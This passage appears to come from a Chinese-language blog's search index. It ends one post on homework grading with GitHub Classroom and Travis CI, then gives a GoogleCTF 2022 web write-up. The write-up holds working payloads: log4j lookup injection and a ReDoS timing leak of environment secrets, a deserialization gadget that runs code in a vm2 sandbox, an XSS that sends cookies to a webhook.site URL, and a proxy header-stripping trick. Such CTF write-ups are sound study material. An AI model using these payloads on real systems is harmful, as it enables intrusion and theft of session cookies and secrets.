的時候，你可以很方便地看到改動以及加上建議： 這樣的方式，豈不是最適合拿來改作業？直接加上註解，可以一行一行修正，合格的作業就直接 approve，不合格的要求修正，然後再送一次 review。 決定好採用 PR 的方式交作業以後，其實還有一個東西要決定，那就是要怎麼送 PR？意思是說，PR 要在哪一個 repo 底下開？大概有以下幾種做法： 老師開一個 hw repo，開權限給所有學生，學生寫完作業以後對 hw 送 PR 學生開一個 hw-student repo，把老師加成協作者，寫完作業送 PR 讓老師 review 前者的話，你必須要在hw底下開不同資料夾，這樣每個學生才有地方來放自己寫的作業。好處很明顯，就是都集中在同一個地方進行管理，但缺點就是這個 repo 會變得很大，因為你可能同時要放 10 個學生寫的作業。 後者的話，學生自己開 repo，然後把老師加進來讓老師能 review，比第一種分散，但是自由度高很多，而且結業以後，學生可以直接把他的 repo 當成作品集的一部分。這兩種比起來，我是比較偏好這個的。 除此之外，其實還有另外一個問題需要解決，那就是有時候作業有固定格式需要遵守，例如說我有一些簡答題，已經在hw下面開好回答的模板，學生只要照著格式寫答案就好，那學生就必須複製這個模板到自己的 repo 底下，其實也是滿麻煩的。 那更好的方式是什麼？ 很簡單，就是結合了前面兩種： 老師開一個放作業模板的 repo，學生 fork 這個 repo 到自己帳號底下，並且利用這個 fork 的 repo 交作業 這樣子學生就不用從零開始，可以直接採用老師已經寫好的交作業模板跟格式，只要照著做就行了。而這種處理方式，其實就是我們等等會提到的 Github Classroom。 Github Classroom我一開始看到這個，還以為是什麼神奇的系統，可以自動幫你完成一堆跟改作業有關的事情。但很可惜，這並不是。 Github Classroom 的系統很簡單，首先你要先註冊一個 organization 才能使用。進去之後你可以建立一個 Classroom，就是一堂課的意思。 而每堂課底下，都有一個地方可以讓你新增作業，在新增作業時你可以關聯自己帳號底下的 repo，介面長這樣： 而這個被關聯的 repo，就是你要拿來出作業的 repo，所以你可以先把很多東西都寫好，例如說交作業的規則跟格式之類的。像我的話就是會先把檔案開好，學生只要在指定的檔案下面寫答案就好： 在新增作業之後，會有一個自動產生的 invitation link，只要學生點擊並且加入之後，就會自動在你的 organization 底下產生新的 repo。 例如說我拿來關聯的 repo 叫做mentor-program，學生的帳號是 abcd，就會產生一個 mentor-program-abcd，而這個 repo 就是基於你原本的所產生的，所以東西都一模一樣。產生之後呢，他會自動把學生本人跟老師設為協作者，然後學生只有 developer 的權限，老師則是有 admin 的權限。 所以說呢，用了 Github Classroom 的好處就是有一個自動化的系統幫你 fork 一份你的 repo 給學生，然後自動設定權限，並且在後台可以看到每個學生的 repo： 做到這裡，你就有一個很不錯的改作業系統了，流程非常簡單： 學生透過 Github Classroom 產生的連結加入 產生 mentor-progam-student_username 的 repo 學生 clone 下來，開新的 branch，寫作業 寫完作業送 PR 老師 review，確認沒問題再 merge 結合 CI 自動改作業剛剛有說過，你學生的 repo 都是以你提供的為基礎 fork 出去的，所以學生可以按照你訂的規則來寫作業。 舉我剛剛提到的例子，我就先幫學生開好hw1.js、hw2.js…他們直接在檔案裡面寫答案就好。如果你有注意到的話，我還幫他們開了hw1.test.js，拿來做 unit test 用的。 在第一週的作業裡面，他們被要求實作出幾個簡單的 function，例如說判斷質數、判斷回文等等。所以每個 js 裡面就只是 export 出一個 function 而已。那要怎麼驗證呢？跑測試！ 既然是那麼簡單的一些 function，那就可以寫 unit test 來驗證結果是否正確，而這個時候，我就想到其實可以結合 CI 做出自動改作業系統。 流程很簡單： 學生送 PR 串上 CI，偵測到有 PR 自動跑 test 在 PR 裡面顯示結果 完成後的結果會像這樣，可以直接在 PR 裡面看到 CI 跑測試之後的結果： 我採用的系統是有名的Travis CI，其實應用上也很簡單，登入進去之後它會自動抓你的 repo，就可以看到一個列表，只要打勾就可以把 Travis 跟 Github 串起來： 不過在打勾之前，你要對你的 repo 做一些設定。其實 CI 的原理很簡單，就是你提供一些指令讓它幫你跑，以我的課程來說，就是跑npm run test而已。 只要在專案的根目錄底下新增.travis.yml，就可以指定你要跑的環境跟其他參數，以我的專案為例： language: node_js node_js: - \"node\" cache: yarn before_script: - wget $TESTCASE_URL notifications: email: false Travis 很聰明，所以預設就會執行npm run test，所以不必在這邊設定任何東西。可以注意到的是，我這邊額外設定了before_script ，而後面接的參數就是你要執行的指令。 會這樣設定是因為我希望在 repo 裡面的 test 檔案可以讓學生自己練習，他們自由修改，而我真正拿來改作業的 test 我把它放在遠端了，在跑 CI 的時候才抓下來，確保學生不可能改到。 準備完成以後，你只要去 CI 的後台打勾，並且進去調一些設定（例如說只要幫 PR 跑測試、環境變數的調整等等），一切就大功告成了！ 結論結合了 Github Classroom 跟 Travis CI，就能夠很輕鬆的打造出一個方便讓學生交作業，也讓老師可以很輕鬆的批改作業，甚至是讓系統自動改作業的服務。 如果你想要更進一步，CI 那端還有很多延伸應用可以做，例如說跑測試失敗的話就自動把 PR 關掉，或者是自動回覆說哪一個作業是錯誤的，甚至也可以把這些訊息記起來，直接做一個學生的 scoreboard 之類的，有很多有趣的應用可以玩。 但若是你只是想要基本的東西，只要簡單設定一下就夠了。 這一篇整理了我最近課程的改作業流程，目前嘗試起來都覺得很不錯，一來是我可以方便改作業，二來是強迫學生熟悉 Git 的流程，而且他們會越來越熟練。 如果你有哪些更好的建議，歡迎在下面留言，文中如果有錯也麻煩不吝指出，感謝。","link":"/2018/02/03/github-classroom-and-travis-ci/"},{"title":"GoogleCTF 2022 筆記","text":"第一次參加 GoogleCTF，這次解了一題 web（HORKOS），然後另外一題偏接近但沒解出來（POSTVIEWER），依照慣例簡單寫一下每一題的 web 的解法，以解出人數來排序。 附上關鍵字如下： log4j ReDoS hop by hop JavaScript magic function(?) async&#x2F;await and Promise race condition LOG4J(105 solves)這題迅速就被隊友解掉了，沒什麼仔細看。 簡單來說大概就是有個 Java 的 web service，會用 log4j 印出你輸入的資料： public class App &#123; public static Logger LOGGER = LogManager.getLogger(App.class); public static void main(String[]args) &#123; String flag = System.getenv(\"FLAG\"); if (flag == null || !flag.startsWith(\"CTF\")) &#123; LOGGER.error(\"&#123;&#125;\", \"Contact admin\"); &#125; LOGGER.info(\"msg: &#123;&#125;\", args); // TODO: implement bot commands String cmd = System.getProperty(\"cmd\"); if (cmd.equals(\"help\")) &#123; doHelp(); return; &#125; if (!cmd.startsWith(\"/\")) &#123; System.out.println(\"The command should start with a /.\"); return; &#125; doCommand(cmd.substring(1), args); &#125; 雖然說這個 log4j 用的版本不是之前那個有漏洞的版本，但因為參數是可控的，所以可以來看一下 log4j 自定義的一些 lookup：https://logging.apache.org/log4j/2.x/manual/lookups.html 用 $&#123;env:FLAG&#125; 就代表環境變數裡的 flag，而 $&#123;java:runtime&#125; 會印出 Java 相關的資訊，把兩個結合起來變成：$&#123;java:$&#123;env:FLAG&#125;&#125;，就會噴出錯誤以及 flag： 2022-07-08 01:31:16,285 main ERROR Resolver failed to lookup java:CTF&#123;d95528534d14dc6eb6aeb81c994ce8bd&#125; java.lang.IllegalArgumentException: CTF&#123;d95528534d14dc6eb6aeb81c994ce8bd&#125; at org.apache.logging.log4j.core.lookup.JavaLookup.lookup(JavaLookup.java:116) at org.apache.logging.log4j.core.lookup.StrLookup.evaluate(StrLookup.java:119) at org.apache.logging.log4j.core.lookup.Interpolator.evaluate(Interpolator.java:190) at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1183) at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1098) at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:974) at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:488) at ..... LOG4J2 (43 solves)同第一題，但是錯誤訊息不會噴出來了，可以利用其他方式來 leak 出來。 例如說隊友用的是這個： %replace&#123;$&#123;env:FLAG&#125;%repeat&#123;x&#125;&#123;200000000&#125;&#125;&#123;CTF.*&#125;&#123;y&#125; %replace&#123;$&#123;env:FLAG&#125;%repeat&#123;x&#125;&#123;200000000&#125;&#125;&#123;CTX.*&#125;&#123;y&#125; 產生一個很長的字串，然後用 replace 字串取代，根據最後的時間判斷是不是包含某個字元，前者大概 4~5 秒，後者用 7 秒多。 也可以參考 maple 構造出的 ReDoS： %replace&#123;S$&#123;env:FLAG&#125;E&#125;&#123;^SCTF.a((((((((((((((((((((.)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*E$&#125;&#123;&#125; 一樣可以從時間差去慢慢把 flag 找出來。 HORKOS (10 solves)這次我自己唯一有解出來的就是這題，滿有趣的。 這一題的話是一個類似購物網站的東西，你在前端選好要的東西以後會產生一包 JSON，送到 /order 去： const script = new VMScript(fs.readFileSync('./shoplib.mjs').toString().replaceAll('export ','') + ` sendOrder(cart, orders) `); app.post('/order', recaptcha.middleware.verify, async (req,res)=>&#123; req.setTimeout(1000); if (req.recaptcha.error &amp;&amp; process.env.NODE_ENV != \"dev\") &#123; res.writeHead(400, &#123;'Content-Type': 'text/html'&#125;); return await res.end(\"invalid captcha\"); &#125; if (!req.body.cart) &#123; res.writeHead(400, &#123;'Content-Type': 'text/html'&#125;); return await res.end(\"bad request\") &#125; // TODO: Group orders by zip code let orders = []; let cart = req.body.cart; let vm = new VM(&#123;sandbox: &#123;orders, cart&#125;&#125;); let result = await vm.run(script); orders = new Buffer.from(JSON.stringify(orders)).toString('base64'); let url = '/order#' + orders; bot.visit(CHALL_URL + url); res.redirect(url); &#125;); 途中會開一個 sandbox 把東西丟到 shoplib.mjs 去跑，最後把產生出來的 JSON base64 以後丟到 /order 去，先來看一下 /order 會做什麼： import * as shop from \"/js/shoplib.mjs\"; window.onload = () => &#123; let orders = JSON.parse(atob(location.hash.substr(1))); console.log(orders); (orders).forEach((order) => &#123; const client = new shop.DeliveryClient(order); document.all.order.innerHTML += client; &#125;) &#125; 基本上就是拿網址上的 orders，然後呼叫 new shop.DeliveryClient，程式碼大概是這樣： const escapeHtml = (str) => str.includes('&lt;') ? str.replace(/&lt;/g, c => `&amp;#$&#123;c.charCodeAt()&#125;;`) : str; const renderLines = (arr) => arr.reduce((p,c) => p+` &lt;div class=\"row\"> &lt;div class=\"col-xl-8\"> &lt;p>$&#123;escapeHtml(c.key).toString()&#125;&lt;/p> &lt;/div> &lt;div class=\"col-xl-2\"> &lt;p class=\"float-end\">$&#123;escapeHtml(getValue(c.value, 'quantity').toString())&#125; &lt;/p> &lt;/div> &lt;div class=\"col-xl-2\"> &lt;p class=\"float-end\">$&#123;escapeHtml(getValue(c.value, 'price').toString())&#125; &lt;/p> &lt;/div> &lt;hr> &lt;/div>`, ''); const getValue = (a, p) => p.split('/').reduce((arr,k) => arr.filter(e=>e.key==k)[0].value, a); const renderOrder = (arr) => &#123; return ` &lt;div class=\"container\"> &lt;p class=\"my-5 mx-5\" style=\"font-size: 30px;\">Delivery Information&lt;/p> &lt;div class=\"row\"> &lt;ul class=\"list-unstyled\"> &lt;li class=\"text-black\">$&#123;escapeHtml(getValue(arr,'cart/address/street').toString())&#125; $&#123;escapeHtml(getValue(arr,'cart/address/number').toString())&#125;&lt;/li> &lt;li class=\"text-muted mt-1\">&lt;span class=\"text-black\">Invoice&lt;/span> #$&#123;escapeHtml(getValue(arr, 'orderId').toString())&#125;&lt;/li> &lt;li class=\"text-black mt-1\">$&#123;new Date().toDateString()&#125;&lt;/li> &lt;/ul> &lt;hr> &lt;/div> $&#123;renderLines(getValue(arr, 'cart/items'))&#125; &lt;div class=\"row text-black\"> &lt;div class=\"col-xl-12\"> &lt;p class=\"float-end fw-bold\">Total: $1337 &lt;/p> &lt;/div> &lt;hr style=\"border: 2px solid black;\"> &lt;/div> &lt;div class=\"text-center\" style=\"margin-top: 90px;\"> &lt;p>Delivered by $&#123;escapeHtml(getValue(arr, 'driver/username').toString())&#125;. &lt;/p> &lt;/div> &lt;/div> `; &#125;; export class DeliveryClient &#123; constructor(pickledOrder) &#123; this.pickledOrder = pickledOrder; &#125; toString() &#123; return renderOrder(this.pickledOrder); &#125; &#125;; 可以看到東西輸出以前基本上都有經過 escapeHtml，除了 renderLines 裡面的這個地方： &lt;div class=\"col-xl-8\"> &lt;p>$&#123;escapeHtml(c.key).toString()&#125;&lt;/p> &lt;/div> 其他地方都是 toString 以後再 escapeHtml，這邊則是相反，這會有什麼差呢？看 escapeHtml 的實作就知道了： const escapeHtml = (str) => str.includes('&lt;') ? str.replace(/&lt;/g, c => `&amp;#$&#123;c.charCodeAt()&#125;;`) : str; escape 的時候是先檢查 str.includes，所以如果 str 是個陣列的話，就可以 bypass filter，達成 XSS。 因此，這題的目標就是要讓 c.key 也就是 item.key 這個東西變成陣列，就可以 XSS 了。 要想達成這件事，就要看 server 那邊到底做了什麼事情，因為我們在 server 時會呼叫 sendOrder(cart, orders)，最後產生出 orders，接著就來看一下到底是怎麼產生出來的： export const pickle = &#123; PRIMITIVES: ['String', 'Number', 'Boolean'], loads: json => &#123; const obj = &#123;&#125;; for (const &#123;key, type, value&#125; of json) &#123; if (type.match(/^pickled/)) &#123; obj[key] = pickle.loads(value); const constructor = type.replace(/^pickled/, ''); obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype; &#125; else &#123; obj[key] = new globalThis[type](value); &#125; &#125; return obj; &#125;, dumps: obj => &#123; const json = []; for (const key in obj) &#123; const value = obj[key]; const type = value.constructor.name; if (typeof type !== 'string') continue; if (typeof value == 'object' &amp;&amp; !pickle.PRIMITIVES.includes(type)) &#123; json.push(&#123; key, type: 'pickled' + type, value: pickle.dumps(value) &#125;); &#125; else if (typeof value !== 'undefined') &#123; json.push(&#123; key, type, value: globalThis[type].prototype.valueOf.call(value) &#125;); &#125; &#125; return json; &#125; &#125;; const DRIVERS = ['drivefast1', 'johnnywalker', 'onagbike']; export const sendOrder = async (value, orders) => &#123; const delivery = new DeliveryService(new Order( pickle.loads(JSON.parse(value))[0] ), orders); return delivery.sendOrder(); &#125;; export class Driver &#123; constructor(username, orders) &#123; this.username = username; this.orders = orders; &#125; async sendOrder(order) &#123; order.driver = this; const pickledOrder = pickle.dumps(order); this.orders.push(pickledOrder); return true; &#125; &#125;; export class DeliveryClient &#123; constructor(pickledOrder) &#123; this.pickledOrder = pickledOrder; &#125; toString() &#123; return renderOrder(this.pickledOrder); &#125; &#125;; export class DeliveryService &#123; constructor(order, orders) &#123; this.order = order; this.orders = orders; &#125; findDriver() &#123; return new Driver( DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders); &#125; async sendOrder() &#123; const driver = this.findDriver(); if (await driver.sendOrder(this.order)) &#123; return this.order.orderId; &#125; &#125; &#125;; export class Order &#123; constructor(cart) &#123; this.cart = cart; this.driver = null; this.orderId = this.cart.shoppingCartId; &#125; &#125;; export class ShoppingCart &#123; constructor() &#123; this.items = &#123;&#125;; this.address = ''; this.shoppingCartId = Math.floor(Math.random() * 1000000000000); &#125; addItem(key, item) &#123; this.items[key] = item; &#125; removeItem(key) &#123; delete this.items[key]; &#125; &#125;; export class Item &#123; constructor(price) &#123; this.price = price; &#125; setQuantity(num) &#123; this.quantity = num; &#125; &#125;; export class Address &#123; constructor(street, number, zip) &#123; this.street = street; this.number = number; this.zip = zip; &#125; &#125;; 這邊程式碼其實滿長的，但間單來說傳進去的 cart 會像這樣： [ &#123; 'key': 'cart', 'type': 'pickledShoppingCart', 'value': [ &#123; 'key': 'items', 'type': 'pickledObject', 'value': [ &#123; 'key': 'abc', 'type': 'pickledItem', 'value': [ &#123; 'key': 'price', 'type': 'Number', 'value': 10 &#125;, &#123; 'key': 'quantity', 'type': 'String', 'value': '1' &#125; ] &#125; ] &#125;, &#123; 'key': 'address', 'type': 'pickledAddress', 'value': [ &#123; 'key': 'street', 'type': 'String', 'value': '' &#125;, &#123; 'key': 'number', 'type': 'Number', 'value': 0 &#125;, &#123; 'key': 'zip', 'type': 'Number', 'value': 0 &#125; ] &#125;, &#123; 'key': 'shoppingCartId', 'type': 'String', 'value': 800600798186 &#125; ] &#125;, &#123; 'key': 'driver', 'type': 'pickledDriver', 'value': [ &#123; 'key': 'username', 'type': 'String', 'value': 'johnnywalker' &#125;, &#123; 'key': 'orders', 'type': 'pickledArray', 'value': [] &#125; ] &#125;, &#123; 'key': 'orderId', 'type': 'String', 'value': 'abc123' &#125; ] 可以想成就是一個序列化過後產生的結果，在 server 會用 pickle.loads(JSON.parse(value))[0] 來還原成各種 class。 而這過程中最可疑的就是 pickle 的相關函式了： export const pickle = &#123; PRIMITIVES: ['String', 'Number', 'Boolean'], loads: json => &#123; const obj = &#123;&#125;; for (const &#123;key, type, value&#125; of json) &#123; if (type.match(/^pickled/)) &#123; obj[key] = pickle.loads(value); const constructor = type.replace(/^pickled/, ''); obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype; &#125; else &#123; obj[key] = new globalThis[type](value); &#125; &#125; return obj; &#125;, dumps: obj => &#123; const json = []; for (const key in obj) &#123; const value = obj[key]; const type = value.constructor.name; if (typeof type !== 'string') continue; if (typeof value == 'object' &amp;&amp; !pickle.PRIMITIVES.includes(type)) &#123; json.push(&#123; key, type: 'pickled' + type, value: pickle.dumps(value) &#125;); &#125; else if (typeof value !== 'undefined') &#123; json.push(&#123; key, type, value: globalThis[type].prototype.valueOf.call(value) &#125;); &#125; &#125; return json; &#125; &#125;; 這邊我一開始注意到的是 obj[key] = new globalThis[type](value); 這一段，如果讓 type 是 Function 的話，我們就可以產生出一個 function，如果可以設法 call 到那個 function，就可以在 sandbox 裡面執行程式碼，去竄改 orders 之類的。 另一個注意到的是： obj[key] = pickle.loads(value); const constructor = type.replace(/^pickled/, ''); obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype; 這邊 pickle.loads 的回傳值一定是 object，搭配後面的 obj[key].__proto__ 那個，我們其實可以讓一個 object 的 __proto__ 變成 String 或是 Number 的 object 之類的，不過似乎沒什麼幫助。 還有嘗試過的是把 key 改成 __proto__，想說這樣是不是可以去改 obj.__proto__.__proto__，但會丟這個錯誤出來： TypeError: Immutable prototype object &#39;#&lt;Object&gt;&#39; cannot have their prototype set 卡在這題其實卡滿久的，我原本的思考方式是想說要執行程式碼可能太難，搞不好可以藉由亂搞 __proto__ 讓最後輸出的 key 變成陣列。但後來我仔細看了一下最後 dump 的程式碼： const json = []; for (const key in obj) &#123; const value = obj[key]; const type = value.constructor.name; if (typeof type !== 'string') continue; if (typeof value == 'object' &amp;&amp; !pickle.PRIMITIVES.includes(type)) &#123; json.push(&#123; key, type: 'pickled' + type, value: pickle.dumps(value) &#125;); &#125; else if (typeof value !== 'undefined') &#123; json.push(&#123; key, type, value: globalThis[type].prototype.valueOf.call(value) &#125;); &#125; &#125; return json; 你的 key 是從 for in 拿出來的，保證是字串，所以這邊輸出的 key 無論如何都會是字串。所以，如果想要讓最後 orders 裡面的 key 是陣列的話，勢必是要能執行程式碼，才能直接對 orders 進行操作。 此時我沈澱了一下，回歸到這題的本質：反序列化。 在 PHP、Python 或是 Java 裡面，都有反序列化相關的洞可以打，而打的方式無非就是找到一些 gadget，也就是一些 magic method 的組合，而這題應該也是這樣的。 於是我重新看了一遍程式碼，找出有沒有哪些地方會有隱式的轉型，就能夠構造一個 toString 或是 valueOf 去執行之類的，不過找了一遍發現沒有。 雖然說沒看到這些東西，但我卻發現一個覺得有機會的地方： export class DeliveryService &#123; constructor(order, orders) &#123; this.order = order; this.orders = orders; &#125; findDriver() &#123; return new Driver( DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders); &#125; async sendOrder() &#123; const driver = this.findDriver(); if (await driver.sendOrder(this.order)) &#123; return this.order.orderId; &#125; &#125; &#125;; 重點是那個 sendOrder 跟它最後 return 的東西。 在 JS 裡面，如果你在 async function 裡面回傳一個 Promise，它是會被解析的，如下： async function test() &#123; const p = new Promise(resolve => &#123; console.log(123) resolve() &#125;) return p &#125; test() 你可以看到 console 印出了 123，而且外層的呼叫並不需要 await。 因此，如果 this.order.orderId 是一個 Promise，就可以在 then 裡面偷塞程式碼了。 馬上來做個實驗： async function test() &#123; var obj = &#123; then: function(resolve) &#123; console.log(123) resolve() &#125; &#125; obj.__proto__ = Promise.prototype return obj &#125; test() 執行以後順利輸出了 123，代表這個 idea 是可行的。所以，我們只要構造出這樣一段 JSON 即可在 sandbox 裡面執行程式碼，並且去改動 orders： &#123; \"key\":\"shoppingCartId\", \"type\":\"pickledPromise\", \"value\":[ &#123; \"key\":\"then\", \"type\":\"Function\", \"value\":\"globalThis.orders.push(JSON.parse('\"+payload+\"'));arguments[0]();\" &#125; ] &#125; （賽後我才想起來其實直接去改 orders[0] 就好，沒必要大費周章再 push 一個） 程式碼裡面的 arguments[0] 是 resolve 參數，沒有呼叫的話會卡住。 最後，我拿來測試以及產生 payload 的程式碼如下： const &#123;VM, VMScript&#125; = require(\"vm2\"); const fs = require('fs'); const script = new VMScript(fs.readFileSync('./myshoplib.mjs').toString().replaceAll('export ','') + ` sendOrder(cart, orders) `); async function main () &#123; let orders = []; let payload = JSON.stringify([ &#123; 'key': 'cart', 'type': 'pickledShoppingCart', 'value': [ &#123; 'key': 'items', 'type': 'pickledObject', 'value': [ &#123; 'key': ['&lt;img src=x onerror=\"location=`https://webhook.site/d8dc1452-8e82-408d-9dcf-8ad713754f36/?q=$&#123;encodeURIComponent(document.cookie)&#125;`\">'], 'type': 'pickledItem', 'value': [ &#123; 'key': 'price', 'type': 'Number', 'value': 10 &#125;, &#123; 'key': 'quantity', 'type': 'String', 'value': '1' &#125; ] &#125; ] &#125;, &#123; 'key': 'address', 'type': 'pickledAddress', 'value': [ &#123; 'key': 'street', 'type': 'String', 'value': '' &#125;, &#123; 'key': 'number', 'type': 'Number', 'value': 0 &#125;, &#123; 'key': 'zip', 'type': 'Number', 'value': 0 &#125; ] &#125;, &#123; 'key': 'shoppingCartId', 'type': 'String', 'value': 800600798186 &#125; ] &#125;, &#123; 'key': 'driver', 'type': 'pickledDriver', 'value': [ &#123; 'key': 'username', 'type': 'String', 'value': 'johnnywalker' &#125;, &#123; 'key': 'orders', 'type': 'pickledArray', 'value': [] &#125; ] &#125;, &#123; 'key': 'orderId', 'type': 'String', 'value': 'PEW' &#125; ]).replaceAll('\"', '\\\\\"') let cart = JSON.stringify( [&#123;\"key\":\"0\",\"type\":\"pickledShoppingCart\",\"value\":[&#123;\"key\":\"items\",\"type\":\"pickledObject\",\"value\":[&#123;\"key\":\"Tomato\",\"type\":\"pickledItem\",\"value\":[&#123;\"key\":\"price\",\"type\":\"Number\",\"value\":10&#125;,&#123;\"key\":\"quantity\",\"type\":\"String\",\"value\":\"1\"&#125;]&#125;,&#123;\"key\":\"Pickle\",\"type\":\"pickledItem\",\"value\":[&#123;\"key\":\"price\",\"type\":\"Number\",\"value\":8&#125;,&#123;\"key\":\"quantity\",\"type\":\"String\",\"value\":\"0\"&#125;]&#125;,&#123;\"key\":\"Pineapple\",\"type\":\"pickledItem\",\"value\":[&#123;\"key\":\"price\",\"type\":\"Number\",\"value\":44&#125;,&#123;\"key\":\"quantity\",\"type\":\"String\",\"value\":\"0\"&#125;]&#125;]&#125;,&#123;\"key\":\"address\",\"type\":\"pickledAddress\",\"value\":[&#123;\"key\":\"street\",\"type\":\"String\",\"value\":\"1\"&#125;,&#123;\"key\":\"number\",\"type\":\"Number\",\"value\":0&#125;,&#123;\"key\":\"zip\",\"type\":\"Number\",\"value\":0&#125;]&#125;,&#123;\"key\":\"shoppingCartId\",\"type\":\"pickledPromise\",\"value\":[&#123;\"key\":\"then\",\"type\":\"Function\",\"value\":\"globalThis.orders.push(JSON.parse('\"+payload+\"'));arguments[0]();\"&#125;]&#125;]&#125;] ); let vm = new VM(&#123;sandbox: &#123;orders, cart, console&#125;&#125;); console.log('before') try &#123; let result = await vm.run(script); &#125; catch(err)&#123; console.log('err', err) &#125; console.log('after') console.log('orders') console.log(orders) console.log(encodeURIComponent(cart)) //console.log(orders[0][0].value[0]) &#125; main() POSTVIEWER (10 solves)直接附上這題的核心程式碼： const SHIM = `&lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> &lt;title>SHIM&lt;/title> &lt;/head> &lt;body> &lt;script> onmessage = (e) => &#123; if (e.data.body === undefined || !e.data.mimeType) &#123; return; &#125;; const blob = new Blob([e.data.body], &#123; type: e.data.mimeType &#125;); onunload = () => e.source.postMessage(\"blob loaded\", \"*\"); location = URL.createObjectURL(blob); &#125;; &lt;\\\\/script> &lt;/body> &lt;/html>` const SHIM_DATA_URL = `data:text/html,&lt;script> location=URL.createObjectURL(new Blob([\\`$&#123;SHIM&#125;\\`], &#123;type:\"text/html\"&#125;)) &lt;/script>`; async function previewIframe(container, body, mimeType) &#123; var iframe = document.createElement('iframe'); iframe.src = SHIM_DATA_URL; container.appendChild(iframe); iframe.addEventListener('load', () => &#123; iframe.contentWindow?.postMessage(&#123; body, mimeType &#125;, '*'); &#125;, &#123; once: true &#125;); &#125; 當你呼叫 previewIframe 的時候，會先產生出一個 iframe，然後裡面的 HTML 再用 location=URL.createObjectURL 的方式產生出另一個 HTML，在裡面用 onmessage 去聽訊息，在外層監聽到 iframe 載入成功後，才用 postMessage 把要顯示的東西丟進去。 這題的話，有一個 race condition 的問題，那就是如果我們一直對 iframe 狂發 postMessage，就能早於 iframe onload 裡面那個，就能搶先一步 render 我們需要的東西，控制 iframe 裡的內容。 由此不難看出這題理想的流程是： previewIframe 被呼叫 iframe 被建立，載入 SHIM SHIM 載入成功，開始監聽訊息 我們的 postMessage 成功，開始載入我們的內容 我們的內容載入完成 iframe onload 觸發，執行 iframe.contentWindow?.postMessage 我們的 HTML 接收到檔案內容，成功竊取檔案 而當初在這解這題時，碰到的問題是 5 跟 6 的順序，不管怎麼試都沒辦法，只能做到：「我們的東西確實有載入，但已經錯過了外層的 postMessage」。 一開始在解題時的想法是為了要贏 race condition，要狂送猛送，像是這樣： function send() &#123; w[0]?.postMessage(&#123; body: 'test', mimeType: 'text/html' &#125;, '*') setTimeout(send, 0) &#125; send() 但這樣卻發現連 XSS 都無法觸發，但把 timeout 改大一點例如說 20 卻可以。 後來我陸續做了一些實驗，明白不能這樣做的原因了，是因為這一段： onmessage = (e) => &#123; if (e.data.body === undefined || !e.data.mimeType) &#123; return; &#125;; const blob = new Blob([e.data.body], &#123; type: e.data.mimeType &#125;); onunload = () => e.source.postMessage(\"blob loaded\", \"*\"); location = URL.createObjectURL(blob); &#125;; 這邊要注意到的是 location = URL.createObjectURL(blob) 這一段跑完以後，location 還不會馬上切換。所以，如果我們一直送 message 的話，就會一直進來 onmessage，然後 location 那行就一直被觸發，上一個 location 還沒載入好就再 assign 一個新的，變成像無窮迴圈那樣。 之所以 timeout 改長會可以，是因為假設改成 20，而 location 載入的時間 &lt; 20ms，新的 message 發送時頁面就被換掉了，因此可以成功觸發 XSS。 然後，我還做了實驗注意到 location 的載入是跟 UI thread 無關的，也就是： location = '//example.com' while(1)&#123;&#125; 這樣的程式碼還是會成功換頁，是沒有問題的。 這題最難把握的是送出 message 的時機，為什麼我們要一直送？因為我們不知道在什麼確切的時間點要送，才要一直去試。我可以等 iframe 有了才去送，但那時的 iframe 還沒載入 SHIM，所以送了訊息也沒用。那我們要怎麼知道 SHIM 載入成功？我們不知道，所以這才麻煩。 後來繼續實驗，也發現可以藉由一直改變 hash 或是用一個很耗時的 selector 造成 main thread 的 delay，但依舊無法控制順序，最後也就沒解出來。 官方的解答在這：https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710 看了之後才發現我把順序搞錯了。 之前我在想的一直是要時時刻刻去 delay main thread，但因為主頁面跟 iframe 是不同 process，所以我們只要一偵測 iframe 載入成功，就可以先想辦法去 delay main thread，這時候 iframe 還是會繼續載入 SHIM，但是 onload 因為被堵住所以暫時不會觸發。 此時我們只要隔個一段時間（官方解是 500ms）之後再去 postMessage 即可，那時的 SHIM 已經載入完畢，而此時 main thread 雖然還是被 block 住，但 iframe 還是會持續載入。 如此一來，最後 main thread 有空做事情的時候，我們的 iframe 就已經載入好了，也就可以拿到資料。 GPUSHOP2 (7 solves)這題是從去年改的，我沒有很仔細看，但應該就是把某一段 path 做 URL encode 導致 proxy 沒配對到路徑之類的。 今年的版本把去年的問題修掉了，無論如何都先加一個 X-Wallet: EMPTY 的 header，所以去年的解法就沒辦法使用。 最後的解法是 hop-by-hop headers，這是什麼東西呢？ HTTP request headers 可以分成兩種類型： End-to-end Hop-by-hop 因為你發 HTTP request 的時候中間可能會經過 proxy 對吧？而 Hop-by-hop 的話就是給 proxy 看的 header，proxy 會對它做一些處理，處理完之後可能就不會 forward 給下一個 server。 底下幾個都屬於 hop-by-hop headers： Connection Keep-Alive Proxy-Authenticate Proxy-Authorization TE Trailers Transfer-Encoding Upgrade 除此之外呢，根據 spec 的定義，放到 Connection 裡面的 headers 也應該被當成 hop-by-hop，例如說： Connection: close, X-Foo, X-Bar 就是叫 proxy 要把 X-Foo 跟 X-Bar 當成 hop-by-hop，把它移除掉，不會繼續發送給下一個 proxy。 因此這一題就可以利用這個功能，把 X-Wallet 給移除： Connection: X-Wallet 更多相關研究可以參考這篇文章：https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers POSTVIEWER 腳本備份備份一下官方解答腳本，裡面看起來是用 postMessage + onmessage 來達到非同步的無窮迴圈的效果，滿有趣的。 &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\" /> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /> &lt;title>POC Vulnerable website&lt;/title> &lt;/head> &lt;body> &lt;h1>Click me!&lt;/h1> &lt;iframe style=\"width:1px;height:1px\" 